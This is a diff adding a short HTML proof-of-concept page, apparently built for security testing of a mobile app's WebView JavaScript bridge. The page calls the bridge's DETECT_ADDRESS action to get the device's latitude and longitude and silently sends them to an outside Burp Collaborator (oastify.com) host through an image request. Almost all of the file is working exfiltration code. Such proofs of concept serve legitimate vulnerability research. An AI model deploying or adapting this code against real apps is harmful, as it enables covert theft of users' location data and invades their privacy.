@@ -1,0 +1,26 @@
+<!-- mex-exfil-location.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>webViewCallback::DETECT_ADDRESS - JavaScript Bridge Call</title>
+  </head>
+  <body>
+    <script>
+      window.webViewCallback.onmessage = function(e) {
+        var d = JSON.parse(e.data);
+        if (d.type === 'DETECT_ADDRESS') {
+          var lat = d.data.location.latitude;
+          var long = d.data.location.longitude;
+          new Image().src = 'https://4w1k2viyg5bt9kta3rwnj4twbnhe54tt.oastify.com/exfil?lat=' + encodeURIComponent(lat) + '&long=' + encodeURIComponent(long);
+          document.write('<pre><b>Location:</b> https://maps.google.com/?q=' + lat + ',' + long + '</pre>');
+        }
+      };
+      window.webViewCallback.postMessage(JSON.stringify({
+        action: "DETECT_ADDRESS",
+        scope: "MEX"
+      }));
+    </script>
+  </body>
+</html>
